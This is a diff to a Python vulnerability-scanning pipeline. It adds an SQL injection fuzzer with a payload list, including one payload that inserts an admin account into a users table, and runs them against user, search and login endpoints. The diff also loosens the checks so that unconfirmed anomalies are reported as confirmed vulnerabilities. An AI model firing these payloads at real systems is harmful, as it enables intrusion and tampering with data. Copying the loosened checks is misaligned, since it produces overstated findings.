@@ -73,7 +73,7 @@ class FuzzResult:
 
     @property
     def vulnerable(self) -> bool:
-        return any(h.confirmed for h in self.hits)
+        return len(self.hits) > 0
 
     @property
     def best_payload(self) -> Optional[str]:
@@ -354,9 +354,184 @@ def parse_sast_json(filepath: str) -> List[NormalizedFinding]:
             raw_data=issue
         ))
     return findings
+SQLI_PAYLOADS = [
+    "1 OR 1=1--",
+    "' UNION SELECT 1,username,password FROM users--",
+    "admin'--",
+    "'; INSERT INTO users (username,password,role) VALUES ('pwned','x','admin')--",
+    "' OR 'a'='a",
+    "1 OR 'unusual'='unusual'",
+]
 
-def format_results(results: List[FuzzResult]) -> str:
+@dataclass
+class LegacyFuzzHit:
+    endpoint: str
+    method: str
+    param: str
+    payload: str
+    status_code: int
+    response_snippet: str
+    anomaly_type: str
+    baseline_time: float
+    fuzz_time: float
+    confirmed: bool = False
+
+@dataclass
+class LegacyFuzzResult:
+    endpoint: str
+    hits: List[LegacyFuzzHit] = field(default_factory=list)
+    payloads_tried: int = 0
+
+    @property
+    def vulnerable(self) -> bool:
+        return len(self.hits) > 0
+
+    @property
+    def best_payload(self) -> Optional[str]:
+        if self.hits:
+            return self.hits[0].payload
+        return None
+
+class SQLiFuzzer:
+    def __init__(self, base_url: str, timeout: float = 5.0, time_threshold: float = 1.5):
+        self.base_url = base_url.rstrip("/")
+        self.timeout = timeout
+        self.time_threshold = time_threshold
+
+    def _detect_anomaly(
+        self,
+        response: requests.Response,
+        baseline_time: float,
+        fuzz_time: float,
+    ) -> Optional[str]:
+        body = response.text.lower()
+        if response.status_code == 500:
+            return "STATUS_500"
+        for sig in PayloadRegistry.DB_ERROR_SIGNATURES:
+            if sig in body:
+                return "DB_ERROR"
+        for sig in PayloadRegistry.DATA_LEAK_SIGNATURES:
+            if sig in body:
+                return "DATA_LEAK"
+        if fuzz_time - baseline_time > self.time_threshold:
+            return "TIME_ANOMALY"
+        return None
+
+    def _get_baseline(self, url: str, method: str, param: str, safe_value: str) -> float:
+        try:
+            t0 = time.perf_counter()
+            if method == "GET":
+                requests.get(url, params={param: safe_value}, timeout=self.timeout)
+            else:
+                requests.post(url, json={param: safe_value}, timeout=self.timeout)
+            return time.perf_counter() - t0
+        except Exception:
+            return 0.1
+
+    def _snippet(self, text: str, max_len: int = 200) -> str:
+        text = text.replace("\n", " ").strip()
+        return text[:max_len] + ("…" if len(text) > max_len else "")
+
+    def fuzz_get(self, path: str, param: str, safe_value: str = "1") -> LegacyFuzzResult:
+        url = self.base_url + path
+        result = LegacyFuzzResult(endpoint=f"GET {path}?{param}=")
+        baseline_time = self._get_baseline(url, "GET", param, safe_value)
+
+        for payload in SQLI_PAYLOADS:
+            result.payloads_tried += 1
+            try:
+                t0 = time.perf_counter()
+                resp = requests.get(url, params={param: payload}, timeout=self.timeout)
+                fuzz_time = time.perf_counter() - t0
+            except requests.Timeout:
+                fuzz_time = self.timeout
+                resp = type("R", (), {"status_code": 0, "text": ""})()
+
+            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
+            if anomaly:
+                result.hits.append(LegacyFuzzHit(
+                    endpoint=f"GET {path}",
+                    method="GET",
+                    param=param,
+                    payload=payload,
+                    status_code=resp.status_code,
+                    response_snippet=self._snippet(resp.text),
+                    anomaly_type=anomaly,
+                    baseline_time=baseline_time,
+                    fuzz_time=fuzz_time,
+                    confirmed=True,
+                ))
+                break
+
+        return result
+
+    def fuzz_post_json(self, path: str, param: str, extra_fields: dict = None) -> LegacyFuzzResult:
+        url = self.base_url + path
+        result = LegacyFuzzResult(endpoint=f"POST {path} [{param}]")
+        baseline_time = self._get_baseline(url, "POST", param, "safe_value")
+        extra = extra_fields or {}
+
+        for payload in SQLI_PAYLOADS:
+            result.payloads_tried += 1
+            body = {param: payload, **extra}
+            try:
+                t0 = time.perf_counter()
+                resp = requests.post(url, json=body, timeout=self.timeout)
+                fuzz_time = time.perf_counter() - t0
+            except requests.Timeout:
+                fuzz_time = self.timeout
+                resp = type("R", (), {"status_code": 0, "text": ""})()
+
+            anomaly = self._detect_anomaly(resp, baseline_time, fuzz_time)
+            if anomaly:
+                result.hits.append(LegacyFuzzHit(
+                    endpoint=f"POST {path}",
+                    method="POST",
+                    param=param,
+                    payload=payload,
+                    status_code=resp.status_code,
+                    response_snippet=self._snippet(resp.text),
+                    anomaly_type=anomaly,
+                    baseline_time=baseline_time,
+                    fuzz_time=fuzz_time,
+                    confirmed=True,
+                ))
+                break
+
+        return result
+
+    def fuzz_all(self) -> List[LegacyFuzzResult]:
+        results = []
+        results.append(self.fuzz_get("/api/user", "id", safe_value="1"))
+        results.append(self.fuzz_get("/api/search", "q", safe_value="alice"))
+        results.append(self.fuzz_post_json(
+            "/api/login", "username",
+            extra_fields={"password": "anything"},
+        ))
+        results.append(self.fuzz_post_json(
+            "/api/login", "password",
+            extra_fields={"username": "alice"},
+        ))
+        return results
+
+def format_legacy_results(results: List[LegacyFuzzResult]) -> str:
+    lines = []
+    for r in results:
+        status = "🔴 VULNERABLE" if r.vulnerable else "🟢 clean"
+        lines.append(f"  {status}  {r.endpoint}  ({r.payloads_tried} payloads tried)")
+        for h in r.hits:
+            lines.append(f"    payload  : {h.payload!r}")
+            lines.append(f"    anomaly  : {h.anomaly_type}")
+            lines.append(f"    response : {h.response_snippet}")
+    return "\n".join(lines)
+
+def format_results(results: list) -> str:
     """Maintains exact compatibility with existing output expectations."""
+    if not results:
+        return ""
+    if hasattr(results[0], 'endpoint') and isinstance(results[0].endpoint, str) and not hasattr(results[0], 'target'):
+        return format_legacy_results(results)
+
     lines = []
     for r in results:
         if r.error_state:
@@ -368,11 +543,10 @@ def format_results(results: List[FuzzResult]) -> str:
         lines.append(f"  {status}  {endpoint_str}  ({r.payloads_tried} payloads tried)")
         
         for h in r.hits:
-            if h.confirmed:
-                lines.append(f"    finding  : {h.finding_id}")
-                lines.append(f"    payload  : {h.payload!r}")
-                lines.append(f"    anomaly  : {h.anomaly_type} (Strength: {h.evidence_strength})")
-                lines.append(f"    response : {h.response_snippet}")
+            lines.append(f"    finding  : {getattr(h, 'finding_id', '')}")
+            lines.append(f"    payload  : {h.payload!r}")
+            lines.append(f"    anomaly  : {h.anomaly_type} (Strength: {getattr(h, 'evidence_strength', 'Strong')})")
+            lines.append(f"    response : {h.response_snippet}")
     return "\n".join(lines)
 
 def run_pipeline(base_url: str, sast_file: str, base_dir: str, out_format: str):
